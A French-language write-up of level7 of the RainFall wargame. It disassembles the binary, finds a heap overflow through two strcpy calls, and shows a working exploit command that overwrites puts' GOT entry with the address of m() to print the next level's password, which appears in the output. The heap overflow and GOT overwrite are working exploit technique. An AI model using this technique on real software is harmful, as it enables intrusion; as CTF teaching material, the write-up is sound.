on a un exécutable `level7` qui crash lorsqu'on le lance

le programme affiche "~~" lorsqu'il y a plus de deux arguments envoyés au `main`

```
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 oui
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 oui non
~~
```

on désassemble l'exécutable :

```
0x08048521 <+0>:     push   %ebp
0x08048522 <+1>:     mov    %esp,%ebp
0x08048524 <+3>:     and    $0xfffffff0,%esp
0x08048527 <+6>:     sub    $0x20,%esp
0x0804852a <+9>:     movl   $0x8,(%esp)             // argument for malloc()
0x08048531 <+16>:    call   0x80483f0 <malloc@plt>  // call malloc()
0x08048536 <+21>:    mov    %eax,0x1c(%esp)         // return of malloc() is put in 0x1c(%esp)
0x0804853a <+25>:    mov    0x1c(%esp),%eax
0x0804853e <+29>:    movl   $0x1,(%eax)             // %eax = 1 (a[0] = 1)
0x08048544 <+35>:    movl   $0x8,(%esp)             // argument for malloc()
0x0804854b <+42>:    call   0x80483f0 <malloc@plt>  // call malloc()
0x08048550 <+47>:    mov    %eax,%edx               // return of malloc() is put in %edx
0x08048552 <+49>:    mov    0x1c(%esp),%eax
0x08048556 <+53>:    mov    %edx,0x4(%eax)          // 0x4(%eax) = %edx (a[1] = malloc(8))
0x08048559 <+56>:    movl   $0x8,(%esp)             // argument for malloc()
0x08048560 <+63>:    call   0x80483f0 <malloc@plt>  // call malloc()
0x08048565 <+68>:    mov    %eax,0x18(%esp)         // return of malloc() is put in 0x18(%esp)
0x08048569 <+72>:    mov    0x18(%esp),%eax
0x0804856d <+76>:    movl   $0x2,(%eax)             // %eax = 2 (b[0] = 2)
0x08048573 <+82>:    movl   $0x8,(%esp)             // argument for malloc()
0x0804857a <+89>:    call   0x80483f0 <malloc@plt>  // call malloc()
0x0804857f <+94>:    mov    %eax,%edx               // return of malloc() is put in %edx
0x08048581 <+96>:    mov    0x18(%esp),%eax
0x08048585 <+100>:   mov    %edx,0x4(%eax)          // 0x4(%eax) = %edx (b[1] = malloc(8))
0x08048588 <+103>:   mov    0xc(%ebp),%eax          // %eax = argv
0x0804858b <+106>:   add    $0x4,%eax               // go to argv[1]
0x0804858e <+109>:   mov    (%eax),%eax
0x08048590 <+111>:   mov    %eax,%edx               // %edx = argv[1]
0x08048592 <+113>:   mov    0x1c(%esp),%eax			// %eax = a
0x08048596 <+117>:   mov    0x4(%eax),%eax          // %eax = a[1]
0x08048599 <+120>:   mov    %edx,0x4(%esp)          // argument 2 for strcpy()
0x0804859d <+124>:   mov    %eax,(%esp)             // argument 1 for strcpy()
0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>  // call strcpy()
0x080485a5 <+132>:   mov    0xc(%ebp),%eax          // %eax = argv
0x080485a8 <+135>:   add    $0x8,%eax               // go to argv[2]
0x080485ab <+138>:   mov    (%eax),%eax
0x080485ad <+140>:   mov    %eax,%edx               // %edx = argv[2]
0x080485af <+142>:   mov    0x18(%esp),%eax         // %eax = b
0x080485b3 <+146>:   mov    0x4(%eax),%eax          // %eax = b[1]
0x080485b6 <+149>:   mov    %edx,0x4(%esp)          // argument 2 for strcpy()
0x080485ba <+153>:   mov    %eax,(%esp)             // argument 1 for strcpy()
0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>  // call strcpy()
0x080485c2 <+161>:   mov    $0x80486e9,%edx         // %edx = "r"
0x080485c7 <+166>:   mov    $0x80486eb,%eax         // eax = "/home/user/level8/.pass"
0x080485cc <+171>:   mov    %edx,0x4(%esp)          // argument 2 for fopen()
0x080485d0 <+175>:   mov    %eax,(%esp)             // argument 1 for fopen()
0x080485d3 <+178>:   call   0x8048430 <fopen@plt>   // call fopen()
0x080485d8 <+183>:   mov    %eax,0x8(%esp)          // return of fopen() is put in argument 3 for fgets()
0x080485dc <+187>:   movl   $0x44,0x4(%esp)         // argument 2 for fgets() (44 = 68)
0x080485e4 <+195>:   movl   $0x8049960,(%esp)       // argument 1 for fgets() (global variable c)
0x080485eb <+202>:   call   0x80483c0 <fgets@plt>   // call fgets()
0x080485f0 <+207>:   movl   $0x8048703,(%esp)       // argument for puts() ("~~")
0x080485f7 <+214>:   call   0x8048400 <puts@plt>    // call puts()
0x080485fc <+219>:   mov    $0x0,%eax
0x08048601 <+224>:   leave
0x08048602 <+225>:   ret
```

```
0x080484f4 <+0>:     push   %ebp
0x080484f5 <+1>:     mov    %esp,%ebp
0x080484f7 <+3>:     sub    $0x18,%esp
0x080484fa <+6>:     movl   $0x0,(%esp)            // argument 1 for time()
0x08048501 <+13>:    call   0x80483d0 <time@plt>   // call time()
0x08048506 <+18>:    mov    $0x80486e0,%edx        // %edx = "%s - %d\n"
0x0804850b <+23>:    mov    %eax,0x8(%esp)         // return of time() is put in argument 3 for printf()
0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)   // argument 2 for printf() (c)
0x08048517 <+35>:    mov    %edx,(%esp)            // argument 1 for printf()
0x0804851a <+38>:    call   0x80483b0 <printf@plt> // call printf()
0x0804851f <+43>:    leave
0x08048520 <+44>:    ret
```

après le désassemblage on comprend qu'il faut appeler la fonction `m`, étant que la fonction `puts` n'est pas utile on peut remplacer l'appel de `puts` par l'appel de `m`, pour cela on a deux appels à strcpy() qui peuvent être utilisés pour faire un dépassement de tampon

pour trouver le décalage du tampon on utilise la commande ltrace et https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

```
level7@RainFall:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
__libc_start_main(0x8048521, 2, 0xbffff724, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                                 = 0x0804a008
malloc(8)                                                                                                 = 0x0804a018
malloc(8)                                                                                                 = 0x0804a028
malloc(8)                                                                                                 = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                                 = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

on rentre _0x37614136_, qui est l'adresse écrasée, et on trouve un décalage de 20

on récupère ensuite les addresses de `puts` et de `m` :

```
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0

...

(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
```

on peut ensuite effectuer noter dépassement de tampon :

```
level7@RainFall:~$ ./level7 $(echo -e "aaaaaaaaaaaaaaaaaaaa\x28\x99\x04\x08") $(echo -e "\xf4\x84\x04\x08")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1708713702
```
